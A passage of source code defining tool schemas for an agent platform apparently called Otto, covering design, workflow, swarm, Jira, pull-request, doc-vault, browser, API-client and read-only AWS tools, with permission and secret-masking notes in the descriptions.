                "description": "Read-only: a Canvas Studio scene by id or title — its row plus `doc_json` (a JSON STRING holding `{type:\"otto-canvas\", format, source}`: the mermaid / D2 / excalidraw source). Use canvas_update_scene to edit it.",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "scene_id": { "type": "string", "description": "Otto canvas scene id or title." }
                    },
                    "required": ["scene_id"]
                }
            },
            {
                "name": "canvas_create_scene",
                "description": "Create a Canvas scene (format: mermaid | d2 | excalidraw) and reference it to this session — it appears in the session's Canvas panel and the Canvas module. Uses this session's workspace (OTTO_WORKSPACE_ID). `source` is the mermaid/D2 diagram text (omit for excalidraw or to start blank).",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "title": { "type": "string", "description": "Scene title." },
                        "format": { "type": "string", "description": "mermaid (default) | d2 | excalidraw." },
                        "source": { "type": "string", "description": "Mermaid/D2 diagram source text." },
                        "section": { "type": "string", "description": "Optional folder path to group the scene under, e.g. \"Platform/Staging\"." }
                    },
                    "required": ["title"]
                }
            },
            {
                "name": "canvas_update_scene",
                "description": "Replace a Canvas scene's diagram source (mermaid/D2 text) with new content, preserving its format. Use canvas_get_scene first to read the current source.",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "scene_id": { "type": "string", "description": "Otto canvas scene id." },
                        "source": { "type": "string", "description": "The new mermaid/D2 diagram source text." }
                    },
                    "required": ["scene_id", "source"]
                }
            },
            {
                "name": "design_list",
                "description": "Read-only: list Design Hall artifacts (frames, graphics, sites, 3D scenes, whiteboards, brand kits) — id, title, studio, format, status, head version, who created / last edited it (created_by_name, last_editor_name) and the product stories it implements (story_ids). The library is global; filter by project_id / studio / format / status / story_id. Newest first; for the next page pass cursor = the last row's `updated_at|id`. Use design_search to find references by content.",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "workspace_id": { "type": "string", "description": "Optional — narrows the global library to one workspace." },
                        "project_id": { "type": "string", "description": "Optional design project id." },
                        "studio": { "type": "string", "description": "frames | graphics | site | 3d | whiteboard | brand | spatial" },
                        "format": { "type": "string", "description": "html | mermaid | d2 | excalidraw | scene3d | otto-canvas | otto-site | png | glb | …" },
                        "status": { "type": "string", "description": "draft | review | approved | shipped | archived" },
                        "story_id": { "type": "string", "description": "Only artifacts that implement this product story." },
                        "limit": { "type": "integer", "description": "Max rows (default 100, cap 500)." },
                        "cursor": { "type": "string", "description": "Next page: `<updated_at>|<id>` of the previous page's last row." }
                    }
                }
            },
            {
                "name": "design_get",
                "description": "Read-only: one design artifact — metadata, head + approved versions, link counts, its working-copy and thumbnail file paths, and (text formats) its source, from the head or `version` (`v3` or a version id). Cite what you borrow as otto://design/<id>@v<seq>.",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "artifact_id": { "type": "string", "description": "Design artifact id." },
                        "version": { "type": "string", "description": "Optional `v<seq>` or version id (default: head)." },
                        "include_content": { "type": "boolean", "description": "Inline the ≤ 256 KiB text source (default true)." }
                    },
                    "required": ["artifact_id"]
                }
            },
            {
                "name": "design_links",
                "description": "Read-only: a design artifact's links — what it uses (embeds, components, brand tokens, the stories it implements, what it was derived from) and where it is used — with the linked artifacts' titles; broken references are flagged.",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "artifact_id": { "type": "string", "description": "Design artifact id." },
                        "dir": { "type": "string", "description": "out | in | both (default)." }
                    },
                    "required": ["artifact_id"]
                }
            },
            {
                "name": "design_search",
                "description": "Read-only: full-text search over the design library (titles, tags, extracted copy / layer / token names, linked story keys, project names), shipped work first. Use it to find earlier work to build on and cite.",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "query": { "type": "string", "description": "Search text." },
                        "workspace_id": { "type": "string", "description": "Optional — narrows to one workspace." },
                        "studio": { "type": "string" },
                        "format": { "type": "string" },
                        "status": { "type": "string" },
                        "story_id": { "type": "string" },
                        "project_id": { "type": "string" },
                        "limit": { "type": "integer", "description": "Max hits (default 50)." }
                    },
                    "required": ["query"]
                }
            },
            {
                "name": "otto_list_workspaces",
                "description": "Read-only: the Otto workspaces you can read — `{items}` with id, name, root_path, my_role. Every `workspace_id` argument accepts one of these ids OR the workspace's name.",
                "inputSchema": { "type": "object", "properties": {} }
            },
            {
                "name": "otto_list_workflows",
                "description": "Read-only: workflows (visual node-graph automations) across EVERY workspace you can read — `{items, current_workspace_id, workspace_count}`, each id, name, description, version, workspace_id + workspace_name, this session's workspace first. A workflow lives in ONE workspace, so look here before concluding it is missing. Workflow tools accept its id OR name.",
                "inputSchema": { "type": "object", "properties": { "workspace_id": { "type": "string", "description": WS_DIR_DESC } } }
            },
            {
                "name": "otto_list_workflow_runs",
                "description": "Read-only: the most recent runs (newest first, ≤ 50) of a workflow — id, status, timing, waiting_approval. Pass `summary:false` for full rows. Feed a run id to otto_get_workflow_run.",
                "inputSchema": { "type": "object", "properties": { "workflow_id": { "type": "string", "description": "Workflow id or name (otto_list_workflows)." }, "summary": { "type": "boolean", "description": "Default true." } }, "required": ["workflow_id"] }
            },
            {
                "name": "otto_get_workflow_run",
                "description": "Read-only: a workflow run's status, per-node step states and outputs, by run id (otto_list_workflow_runs).",
                "inputSchema": { "type": "object", "properties": { "run_id": { "type": "string", "description": "Workflow run id." } }, "required": ["run_id"] }
            },
            {
                "name": "otto_list_goal_loops",
                "description": "Read-only: goal loops across EVERY workspace you can read — `{items, …}` with id, name, repo_path, status, workspace_id + workspace_name.",
                "inputSchema": { "type": "object", "properties": { "workspace_id": { "type": "string", "description": WS_DIR_DESC } } }
            },
            {
                "name": "otto_list_broker_clusters",
                "description": "Read-only: message-broker (Kafka) clusters across EVERY workspace you can read (global profiles once) — `{items, …}` with id, name, bootstrap_servers, workspace_id + workspace_name. Broker tools accept a cluster's id OR name.",
                "inputSchema": { "type": "object", "properties": { "workspace_id": { "type": "string", "description": WS_DIR_DESC } } }
            },
            {
                "name": "otto_list_broker_topics",
                "description": "Read-only: list the topics of a broker cluster.",
                "inputSchema": { "type": "object", "properties": { "cluster_id": { "type": "string", "description": "Broker cluster id or name (otto_list_broker_clusters)." } }, "required": ["cluster_id"] }
            },
            {
                "name": "otto_list_issue_accounts",
                "description": "Read-only: YOUR Jira/Confluence accounts — `{items}` with id, label, email, base_url, provider (never the token). Issue tools take `account_id` = one of these ids OR its label / email / base URL, and may omit it when you have exactly one account.",
                "inputSchema": { "type": "object", "properties": {} }
            },
            {
                "name": "otto_search_issues",
                "description": "Read-only: search Jira issues. `query` is FREE TEXT (summary + description), or an issue key (`GS-123`) for that issue — NOT JQL. Empty `query` → issues assigned to you. Optional `project` key. Up to 25 `{key, summary, status, issue_type, url}`; page with `start_at`.",
                "inputSchema": { "type": "object", "properties": { "account_id": { "type": "string", "description": ISSUE_ACCOUNT_DESC }, "query": { "type": "string" }, "project": { "type": "string" }, "start_at": { "type": "integer" } } }
            },
            {
                "name": "otto_list_issue_transitions",
                "description": "Read-only: a Jira issue's available status transitions `[{id, name, to_status}]`.",
                "inputSchema": { "type": "object", "properties": { "account_id": { "type": "string", "description": ISSUE_ACCOUNT_DESC }, "key": { "type": "string" } }, "required": ["key"] }
            },
            {
                "name": "otto_list_swarms",
                "description": "Read-only: agent swarms across EVERY workspace you can read — `{items, …}` with id, name, status, workspace_id + workspace_name. Swarm tools accept a swarm's id OR name.",
                "inputSchema": { "type": "object", "properties": { "workspace_id": { "type": "string", "description": WS_DIR_DESC } } }
            },
            {
                "name": "swarm_list_projects",
                "description": "Read-only: list a swarm's projects (id, name, repo, goal). Project ids feed swarm_list_tasks / swarm_create_task.",
                "inputSchema": { "type": "object", "properties": { "swarm_id": { "type": "string" } }, "required": ["swarm_id"] }
            },
            {
                "name": "swarm_list_tasks",
                "description": "Read-only: list a project's board tasks (id, title, status, assignee, priority, depends_on).",
                "inputSchema": { "type": "object", "properties": { "project_id": { "type": "string" } }, "required": ["project_id"] }
            },
            {
                "name": "swarm_utilization",
                "description": "Read-only: a swarm's board-utilization snapshot — parallel cap vs live runs, ready vs open tasks by status, and which agents are busy/idle. Use it to spot wasted capacity before dispatching.",
                "inputSchema": { "type": "object", "properties": { "swarm_id": { "type": "string" } }, "required": ["swarm_id"] }
            },
            {
                "name": "swarm_create_task",
                "description": "Create a task on a project board (Editor-gated). Unassigned tasks are auto-assigned to the best-fitting agent when scheduled. Managers: prefer editing the plan over piling on new tasks.",
                "inputSchema": { "type": "object", "properties": { "project_id": { "type": "string" }, "title": { "type": "string" }, "description": { "type": "string" }, "assignee_agent_id": { "type": "string" }, "priority": { "type": "string", "description": "low|medium|high|urgent" } }, "required": ["project_id", "title"] }
            },
            {
                "name": "swarm_update_task",
                "description": "Update a board task (Editor-gated): status (backlog|todo|in_progress|in_review|blocked|done|cancelled), assignee_agent_id, priority, title, description. Use to unblock, reassign, reprioritize or close stale items.",
                "inputSchema": { "type": "object", "properties": { "task_id": { "type": "string" }, "status": { "type": "string" }, "assignee_agent_id": { "type": "string" }, "priority": { "type": "string" }, "title": { "type": "string" }, "description": { "type": "string" } }, "required": ["task_id"] }
            },
            {
                "name": "swarm_run_task",
                "description": "Dispatch a board task now (Editor-gated): creates a run and launches the assignee's agent session immediately instead of waiting for the coordinator tick. Refused (409) when the task is not todo/blocked/backlog, the swarm is aborted or budget-paused, or the agent is busy; 400 when the swarm has no active agent.",
                "inputSchema": { "type": "object", "properties": { "task_id": { "type": "string" } }, "required": ["task_id"] }
            },
            {
                "name": "swarm_stop_run",
                "description": "Stop an in-flight swarm run (Editor-gated): cancels the turn and marks the run stopped. Use on wedged or duplicate dispatches. A run that already finished is returned unchanged — check `run.status`.",
                "inputSchema": { "type": "object", "properties": { "run_id": { "type": "string" } }, "required": ["run_id"] }
            },
            {
                "name": "otto_search_memory",
                "description": "Read-only: keyword (FTS) search of this workspace's agent memories for a free-text query; returns the top hits.",
                "inputSchema": { "type": "object", "properties": { "query": { "type": "string" }, "k": { "type": "integer" } }, "required": ["query"] }
            },
            {
                "name": "otto_list_repos",
                "description": "Read-only: list the git repositories in EVERY workspace you can read — `{repos, current_workspace_id, workspace_count}`; each row has id, name, path, remote_url, workspace_id + workspace_name, and `current` (this session's workspace, listed first). A repo is registered in exactly one workspace, so the one you need may live in another — look here before concluding it is missing. Optional `workspace_id` narrows to one workspace.",
                "inputSchema": { "type": "object", "properties": { "workspace_id": { "type": "string", "description": "Optional: only this workspace's repos." } } }
            },
            {
                "name": "otto_list_sessions",
                "description": "Read-only: list a workspace's agent/terminal sessions (your own unless you are an admin). Default: this session's workspace; `workspace_id` (id or name) picks another.",
                "inputSchema": { "type": "object", "properties": { "workspace_id": { "type": "string", "description": "Optional workspace id or name (default: this session's)." } } }
            },
            {
                "name": "otto_get_session",
                "description": "Read-only: one session's detail by id (status, provider, cwd, provider_session_id, live).",
                "inputSchema": { "type": "object", "properties": { "session_id": { "type": "string" } }, "required": ["session_id"] }
            },
            {
                "name": "otto_wait_session",
                "description": "Read-only: block up to 25 s until a session's status is one of the awaited set (default `idle,exited`), then return it with `reached`. Loop it for longer waits — `idle` means the agent's turn ended.",
                "inputSchema": { "type": "object", "properties": { "session_id": { "type": "string" }, "status": { "type": "string", "description": "comma-separated: running,working,idle,exited,reconnectable" }, "timeout_secs": { "type": "integer", "description": "1..25, default 20" } }, "required": ["session_id"] }
            },
            {
                "name": "otto_open_session",
                "description": "MUTATING (Agents Edit): open a new agent session (claude | codex) in this workspace and queue `prompt` as its first message once the TUI is up. Returns the session; poll otto_wait_session. For delegating work to visible, resumable worker sessions — never spawn more than the user's budget.",
                "inputSchema": { "type": "object", "properties": { "provider": { "type": "string" }, "title": { "type": "string" }, "cwd": { "type": "string" }, "model": { "type": "string", "description": "optional; provider default when omitted" }, "prompt": { "type": "string" } }, "required": ["provider"] }
            },
            {
                "name": "otto_send_message",
                "description": "MUTATING (Agents Edit): send one text message to ONE live agent session by id, as if typed + Enter. Drives a running agent — only your own sessions unless you are an admin.",
                "inputSchema": { "type": "object", "properties": { "session_id": { "type": "string" }, "text": { "type": "string" } }, "required": ["session_id", "text"] }
            },
            {
                "name": "otto_list_product_stories",
                "description": "Read-only: product stories — a GLOBAL library shared by every workspace — `{items}` with id, source_key (the Jira key), title, stage, url. otto_product_story accepts a story's id OR its Jira key.",
                "inputSchema": { "type": "object", "properties": {} }
            },
            {
                "name": "otto_list_findings",
                "description": "Read-only: list a code review's findings (with workflow state) by review id — review ids come from otto_git_pr_review (`reviews[].id`).",
                "inputSchema": { "type": "object", "properties": { "review_id": { "type": "string" } }, "required": ["review_id"] }
            },
            {
                "name": "otto_list_prs",
                "description": "Read-only: list a repo's pull requests as `{items, has_more, page, per_page}` (each item: number, title, state, source/destination branches, author, url). Optional `state` (open|merged|declined|all); page with `page` while `has_more`, `per_page` ≤ 100 (default 50). Use this to find the PR number for otto_get_pr / otto_comment_pr.",
                "inputSchema": { "type": "object", "properties": { "repo_id": { "type": "string", "description": REPO_REF_DESC }, "state": { "type": "string" }, "page": { "type": "integer" }, "per_page": { "type": "integer" } } }
            },
            {
                "name": "otto_get_pr",
                "description": "Read-only: one pull request plus its existing review comments (id, body, path, line, thread_id). Call this BEFORE commenting so you can dedupe and reply in-thread instead of posting duplicates.",
                "inputSchema": { "type": "object", "properties": { "repo_id": { "type": "string", "description": REPO_REF_DESC }, "pr_number": { "type": "integer" } }, "required": ["pr_number"] }
            },
            {
                "name": "otto_comment_pr",
                "description": "Post a comment on a pull request. Pass `path` (and optionally `line`) to anchor it INLINE on a file in the diff; omit both for a PR-level comment; pass `in_reply_to` with an existing comment id to reply in that thread. Mutating and outward-facing — the comment is visible to everyone on the PR.",
                "inputSchema": { "type": "object", "properties": {
                    "repo_id": { "type": "string", "description": REPO_REF_DESC },
                    "pr_number": { "type": "integer" },
                    "body": { "type": "string", "description": "Markdown comment body." },
                    "path": { "type": "string", "description": "Repo-relative file path to anchor the comment to." },
                    "line": { "type": "integer", "description": "1-indexed line in `path` to anchor to." },
                    "in_reply_to": { "type": "string", "description": "Existing comment id to reply to." }
                }, "required": ["pr_number", "body"] }
            },
            {
                "name": "otto_usage_summary",
                "description": "Read-only: token-usage rollups by provider/day/session/feature (root-only endpoint; non-root callers get a clean error). Optional `days` (default 30); `otto_only` (default true) — false includes usage outside Otto sessions.",
                "inputSchema": { "type": "object", "properties": { "days": { "type": "integer" }, "otto_only": { "type": "boolean" } } }
            },
            {
                "name": "otto_list_improvement_runs",
                "description": "Read-only: list a workspace's self-improvement runs (status + summary). Default: this session's workspace.",
                "inputSchema": { "type": "object", "properties": { "workspace_id": { "type": "string", "description": "Optional workspace id or name." } } }
            },
            {
                "name": "otto_list_improvement_edits",
                "description": "Read-only: list a workspace's self-improvement edit suggestions. `status` defaults to pending; pass applied / rejected / rolled_back / conflict to see others. Default: this session's workspace.",
                "inputSchema": { "type": "object", "properties": { "workspace_id": { "type": "string", "description": "Optional workspace id or name." }, "status": { "type": "string" } } }
            },
            {
                "name": "otto_vault_list",
                "description": "Read-only: list the markdown doc vaults — a GLOBAL library every workspace shares (id, name, root_path, okf, note/link counts, scan state). Every other otto_vault_* tool takes a vault's id OR name as `vault_id`.",
                "inputSchema": { "type": "object", "properties": {} }
            },
            {
                "name": "otto_vault_dir",
                "description": "Read-only: one level of a vault's folder tree — subfolders (with child counts), notes and attachments. Empty `path` = vault root. Read `index.md` first in OKF vaults (progressive disclosure).",
                "inputSchema": { "type": "object", "properties": { "vault_id": { "type": "integer" }, "path": { "type": "string", "description": "Vault-relative folder path; empty for root." } }, "required": ["vault_id"] }
            },
            {
                "name": "otto_vault_read",
                "description": "Read-only: a note's raw markdown + indexed metadata (frontmatter, tags, aliases, headings, word count, hash for optimistic writes) + outgoing links (resolved).",
                "inputSchema": { "type": "object", "properties": { "vault_id": { "type": "integer" }, "path": { "type": "string", "description": "Vault-relative note path incl. .md" } }, "required": ["vault_id", "path"] }
            },
            {
                "name": "otto_vault_search",
                "description": "Read-only: full-text (FTS5) search over a vault's notes with snippets; supports tag:/path:/type: operators inside the query.",
                "inputSchema": { "type": "object", "properties": { "vault_id": { "type": "integer" }, "query": { "type": "string" }, "limit": { "type": "integer" } }, "required": ["vault_id", "query"] }
            },
            {
                "name": "otto_vault_backlinks",
                "description": "Read-only: notes that link TO a given note (linked mentions), each with a context snippet.",
                "inputSchema": { "type": "object", "properties": { "vault_id": { "type": "integer" }, "path": { "type": "string" } }, "required": ["vault_id", "path"] }
            },
            {
                "name": "otto_vault_tags",
                "description": "Read-only: every tag in a vault with its note count.",
                "inputSchema": { "type": "object", "properties": { "vault_id": { "type": "integer" } }, "required": ["vault_id"] }
            },
            {
                "name": "otto_vault_graph",
                "description": "Read-only: the vault link graph in a compact form (parallel node arrays + flat [src,dst,...] edge index pairs). Defaults to the LOCAL neighborhood of `path` (depth 1-3); mode=full returns the whole graph (edge-budgeted).",
                "inputSchema": { "type": "object", "properties": { "vault_id": { "type": "integer" }, "mode": { "type": "string", "description": "local (default when path given) | full" }, "path": { "type": "string" }, "depth": { "type": "integer" } }, "required": ["vault_id"] }
            },
            {
                "name": "otto_vault_okf_validate",
                "description": "Read-only: deterministic OKF v0.1 conformance report for a vault — errors E1 (no/unparseable frontmatter), E2 (missing type), E3 (reserved-file structure); warnings W1-W5. Never eyeball conformance: run this.",
                "inputSchema": { "type": "object", "properties": { "vault_id": { "type": "integer" } }, "required": ["vault_id"] }
            },
            {
                "name": "otto_vault_write",
                "description": "Create or update a markdown note in a doc vault (Editor-gated; parent folders auto-created). Pass `if_hash` from otto_vault_read for optimistic concurrency (\"\" = must-not-exist). Prefer OKF format: YAML frontmatter with `type` (+ one-sentence description), markdown links, then otto_vault_okf_validate.",
                "inputSchema": { "type": "object", "properties": { "vault_id": { "type": "integer" }, "path": { "type": "string", "description": "Vault-relative note path incl. .md" }, "content": { "type": "string" }, "if_hash": { "type": "string" } }, "required": ["vault_id", "path", "content"] }
            },
            {
                "name": "otto_vault_write_file",
                "description": "Create or update a guarded UTF-8 documentation artifact (Editor-gated): OpenAPI YAML, JSON, D2, Mermaid, text, or CSV. Parent folders are auto-created; pass `if_hash` for optimistic concurrency. Markdown must use otto_vault_write.",
                "inputSchema": { "type": "object", "properties": { "vault_id": { "type": "integer" }, "path": { "type": "string", "description": "Vault-relative path ending .yaml/.yml/.json/.d2/.mmd/.txt/.csv" }, "content": { "type": "string" }, "if_hash": { "type": "string" } }, "required": ["vault_id", "path", "content"] }
            },
            {
                "name": "otto_vault_rename",
                "description": "Rename/move a note or folder (Editor-gated). Every referencing wikilink/markdown link across the vault is rewritten on disk; returns links_updated.",
                "inputSchema": { "type": "object", "properties": { "vault_id": { "type": "integer" }, "from": { "type": "string" }, "to": { "type": "string" } }, "required": ["vault_id", "from", "to"] }
            },
            {
                "name": "otto_vault_delete",
                "description": "Soft-delete a note (Editor-gated): moves it into the vault's .trash/ folder — never destroys files. Prefer an OKF **Deprecation** log entry over deletion for knowledge that aged out.",
                "inputSchema": { "type": "object", "properties": { "vault_id": { "type": "integer" }, "path": { "type": "string" } }, "required": ["vault_id", "path"] }
            },
            {
                "name": "browser_navigate",
                "description": "Open a reader-mode browser tab on `url` (fetches it, netguard-checked — loopback/private/metadata addresses are refused) and return its fetched title. The tab appears in this workspace's Browser module.",
                "inputSchema": { "type": "object", "properties": { "url": { "type": "string" } }, "required": ["url"] }
            },
            {
                "name": "browser_page",
                "description": "Read-only: fetch a URL (netguard-checked) and return its extracted markdown, title, and which engine rendered it. `degraded:true` means the plain-fetch fallback ran (no JS execution).",
                "inputSchema": { "type": "object", "properties": { "url": { "type": "string" } }, "required": ["url"] }
            },
            {
                "name": "browser_query",
                "description": "Read-only: fetch a URL (netguard-checked, same as browser_page) and return every node matching a CSS `selector` — outer HTML and text content per match.",
                "inputSchema": { "type": "object", "properties": { "url": { "type": "string" }, "selector": { "type": "string" } }, "required": ["url", "selector"] }
            },
            {
                "name": "browser_summarize",
                "description": "Fetch a URL (netguard-checked) and run one short-lived agent turn to summarize its markdown (capped at 30k chars) for a developer notebook.",
                "inputSchema": { "type": "object", "properties": { "url": { "type": "string" } }, "required": ["url"] }
            },
            {
                "name": "browser_marks",
                "description": "Read-only: list the DOM marks (annotations) the user picked in this workspace's Browser — selector, visible text, an HTML excerpt, and the user's note per mark, oldest first. Pass `url` to limit to one page. When the user says \"the element I marked\", this is where to look.",
                "inputSchema": { "type": "object", "properties": { "url": { "type": "string" } } }
            },
            {
                "name": "browser_login",
                "description": "Sign in to a stored site credential for `domain` (a Site Credential the user created and explicitly marked \"allow agent use\" — otherwise this is refused). The daemon resolves the credential server-side, drives the fill+submit over CDP, and returns only whether it worked — the password never enters this tool's arguments, result, or the audit log.",
                "inputSchema": { "type": "object", "properties": { "domain": { "type": "string" } }, "required": ["domain"] }
            },
            {
                "name": "otto_list_agent_rooms",
                "description": "Read-only: agent rooms across EVERY workspace you can read — `{items, …}` with id, name, workspace_id + workspace_name. otto_room_read / otto_room_post take a room's id OR name.",
                "inputSchema": { "type": "object", "properties": { "workspace_id": { "type": "string", "description": WS_DIR_DESC } } }
            },
            {
                "name": "otto_room_post",
                "description": "Personal agents: post a message (max 16KB) into an agent room this agent is a member of. The message is persisted and shown to the user live — rooms are the only agent-to-agent channel. Your session identity determines which agent is speaking.",
                "inputSchema": { "type": "object", "properties": { "room_id": { "type": "string" }, "text": { "type": "string" } }, "required": ["room_id", "text"] }
            },
            {
                "name": "otto_room_read",
                "description": "Personal agents: read messages from an agent room this agent is a member of, oldest first. Pass `after` (the last message id you saw) to page forward.",
                "inputSchema": { "type": "object", "properties": { "room_id": { "type": "string" }, "after": { "type": "string" }, "limit": { "type": "integer" } }, "required": ["room_id"] }
            },
            // ---- API client. Reads return the daemon's masked agent shapes;
            // writers use the normal ApiClient:Edit routes as the session owner.
            {
                "name": "otto_api_list",
                "description": "READ-ONLY: discover the workspace's API client — collections, saved requests (id/name/method/url template/auth type), environments (names + non-secret variables; secret values never returned) and automations. Call this FIRST to get ids; `q` filters by substring, `kind` narrows the set.",
                "inputSchema": { "type": "object", "properties": {
                    "q": { "type": "string", "description": "Optional substring filter." },
                    "collection_id": { "type": "string", "description": "Optional collection id filter." },
                    "kind": { "type": "string", "enum": ["all", "requests", "environments", "automations"], "description": "Result kind (default all)." }
                } }
            },
            {
                "name": "otto_api_get_request",
                "description": "READ-ONLY: one saved request in full (headers/query/body/docs/scripts) with every secret masked. Pass `request_id` or a unique `name`. A body over 64 KiB is capped and ends with `…[truncated]`.",
                "inputSchema": { "type": "object", "properties": {
                    "request_id": { "type": "string", "description": "Saved request id." },
                    "name": { "type": "string", "description": "Unique saved request name (used when request_id is omitted)." }
                } }
            },
            {
                "name": "otto_api_history",
                "description": "READ-ONLY: past executions (method/url/status/duration/source agent|human). Pass `id` for one entry with its response; else filter with q/status/request_id/source, limit ≤ 100.",
                "inputSchema": { "type": "object", "properties": {
                    "id": { "type": "string", "description": "History entry id; when present returns one entry." },
                    "q": { "type": "string", "description": "Optional method or URL substring." },
                    "status": { "type": "integer", "description": "Optional HTTP status." },
                    "request_id": { "type": "string", "description": "Optional saved request id." },
                    "source": { "type": "string", "enum": ["agent", "human"], "description": "Optional execution source." },
                    "limit": { "type": "integer", "minimum": 1, "maximum": 100, "description": "Maximum rows (default 25, cap 100)." }
                } }
            },
            {
                "name": "otto_api_execute",
                "description": "SENDS A REAL HTTP REQUEST: execute a SAVED request (by `request_id` or unique `name`) against an environment (`environment` = id or name, default the active one). Non-GET/HEAD/OPTIONS methods require `confirm:true`; an agent-authored request targeting a host no human request/run used requires `confirm_new_host:true` (the error says which). Secrets are resolved server-side and scrubbed from the result; JWTs come back as decoded claims (`jwt_claims`), never the token. `vars` override variables (values must not contain '{{').",
                "inputSchema": { "type": "object", "properties": {
                    "request_id": { "type": "string", "description": "Saved request id." },
                    "name": { "type": "string", "description": "Unique saved request name (used when request_id is omitted)." },
                    "environment": { "type": "string", "description": "Environment id or unique name; omit for active." },
                    "vars": { "type": "object", "additionalProperties": { "type": "string" }, "description": "Per-run variable overrides; values cannot contain '{{'." },
                    "timeout_ms": { "type": "integer", "minimum": 1, "maximum": 60000 },
                    "confirm": { "type": "boolean", "description": "Confirm a non-safe HTTP method." },
                    "confirm_new_host": { "type": "boolean", "description": "Confirm an unknown host for an agent-authored request." },
                    "decode_jwt": { "type": "boolean", "description": "Return safe JWT claims (default true), never tokens." }
                } }
            },
            {
                "name": "otto_api_upsert_request",
                "description": "PERSISTS: create (no `request_id`; `name` required) or update a saved request. Accepts fields or a `curl` line (parsed server-side; explicit fields win). `collection_name` finds-or-creates a collection. On update every field you omit keeps its stored value (`docs_md` merges into the stored extras). Returns the saved request with secrets masked.",
                "inputSchema": { "type": "object", "properties": {
                    "request_id": { "type": "string", "description": "Saved request id to update; omit to create." },
                    "name": { "type": "string", "description": "Saved request name." },
                    "method": { "type": "string", "description": "HTTP method (default GET)." },
                    "url": { "type": "string", "description": "URL template." },
                    "headers": { "type": "array", "items": { "type": "object", "properties": { "key": { "type": "string" }, "value": { "type": "string" }, "enabled": { "type": "boolean" } }, "required": ["key", "value"] } },
                    "query": { "type": "array", "items": { "type": "object", "properties": { "key": { "type": "string" }, "value": { "type": "string" }, "enabled": { "type": "boolean" } }, "required": ["key", "value"] } },
                    "body_mode": { "type": "string", "enum": ["none", "json", "raw", "form", "multipart", "graphql"] },
                    "body": { "type": "string" },
                    "auth": { "type": "object", "description": "Request auth; plaintext secret members are moved to Keychain by the daemon." },
                    "collection_id": { "type": "string" },
                    "collection_name": { "type": "string", "description": "Unique collection name to find or create." },
                    "docs_md": { "type": "string", "description": "Markdown request documentation." },
                    "curl": { "type": "string", "description": "curl command parsed server-side; explicit fields win." }
                } }
            },
            {
                "name": "otto_api_run_automation",
                "description": "SENDS REAL HTTP REQUESTS: run a human-authored automation (`automation_id` or unique `name`) — its steps, assertions and extractions; returns the per-step report.",
                "inputSchema": { "type": "object", "properties": {
                    "automation_id": { "type": "string", "description": "Automation id." },
                    "name": { "type": "string", "description": "Unique automation name (used when automation_id is omitted)." }
                } }
            },
            // ---- AWS console (docs/design/aws-k8s-consoles.md §6). Every tool
            // shells `aws` CLI v2 through the daemon with the ACCOUNT's own
            // credentials; the caller needs the per-service feature grant
            // (`aws_s3` / `aws_sqs` / `aws_ec2` / `aws_athena` / `aws_eks`).
            // A `login required:` error means the account's SSO session
            // expired — tell the user to press "Sign in" in the AWS module.
            {
                "name": "aws_list_accounts",
                "description": "Read-only: list the AWS accounts configured in Otto — id, name, auth_mode, region, environment and (for users who may configure the account) identity (account/arn) + the cached per-service permission probe. Every other aws_* tool takes an account's id OR name as `account_id`; never contains secrets.",
                "inputSchema": { "type": "object", "properties": {} }
            },
            {
                "name": "aws_s3_list_buckets",
                "description": "Read-only: list the S3 buckets visible to an AWS account (name, creation_date, region). Needs `account_id` from aws_list_accounts. S3 in Otto is read-only by design — there is no upload/delete tool.",
                "inputSchema": { "type": "object", "properties": { "account_id": { "type": "string" }, "region": { "type": "string", "description": "Optional region override (defaults to the account's region)." } }, "required": ["account_id"] }
            },
            {
                "name": "aws_s3_list_objects",
                "description": "Read-only: list one level of an S3 bucket like a folder — `prefixes` (sub-folders) and `objects` (key, size, last_modified, storage_class, etag) under `prefix` (use a trailing `/`). Page with `token` = the previous result's `next_token` while `is_truncated`; `max` caps keys per page (default 500, max 1000).",
                "inputSchema": { "type": "object", "properties": { "account_id": { "type": "string" }, "bucket": { "type": "string" }, "prefix": { "type": "string" }, "token": { "type": "string" }, "max": { "type": "integer" }, "region": { "type": "string" } }, "required": ["account_id", "bucket"] }
            },
            {
                "name": "aws_s3_preview",
                "description": "Read-only: preview the first bytes of a TEXT-like S3 object (text/JSON/CSV/YAML/log) as `{text, truncated, content_type}`. `max_bytes` default 64 KiB, cap 1 MiB. Binary objects return `{binary: true}` — there is no download tool; ask the user to download from the AWS module.",
                "inputSchema": { "type": "object", "properties": { "account_id": { "type": "string" }, "bucket": { "type": "string" }, "key": { "type": "string" }, "max_bytes": { "type": "integer" }, "region": { "type": "string" } }, "required": ["account_id", "bucket", "key"] }
            },
            {
                "name": "aws_sqs_list_queues",
                "description": "Read-only: list an account's SQS queues (`url`, `name`, `fifo`). Optional `prefix` filters by queue-name prefix. The returned `url` is the id every other SQS tool takes.",
                "inputSchema": { "type": "object", "properties": { "account_id": { "type": "string" }, "prefix": { "type": "string" }, "region": { "type": "string" } }, "required": ["account_id"] }
            },
            {
                "name": "aws_sqs_peek",
                "description": "Read-only: peek up to `max` (1..10, default 10) messages on an SQS queue WITHOUT consuming them (receive with visibility timeout 0) — message_id, body, attributes, message_attributes. Use it to inspect a queue or a DLQ; the messages stay in the queue.",
                "inputSchema": { "type": "object", "properties": { "account_id": { "type": "string" }, "url": { "type": "string", "description": "Queue URL from aws_sqs_list_queues." }, "max": { "type": "integer" }, "region": { "type": "string" } }, "required": ["account_id", "url"] }
            },
            {
                "name": "aws_sqs_send",
                "description": "MUTATING (aws_sqs Edit): send ONE message with `body` to an SQS queue `url`; returns `{message_id}`. FIFO queues (`.fifo`) require `group_id` (and `dedup_id` unless content-based dedup is on). Optional `delay_seconds` (0..900). Only send when the user asked you to produce a message.",
                "inputSchema": { "type": "object", "properties": { "account_id": { "type": "string" }, "url": { "type": "string" }, "body": { "type": "string" }, "delay_seconds": { "type": "integer" }, "group_id": { "type": "string" }, "dedup_id": { "type": "string" }, "message_attributes": { "type": "object" }, "region": { "type": "string" } }, "required": ["account_id", "url", "body"] }
            },
            {
                "name": "aws_ec2_list_instances",
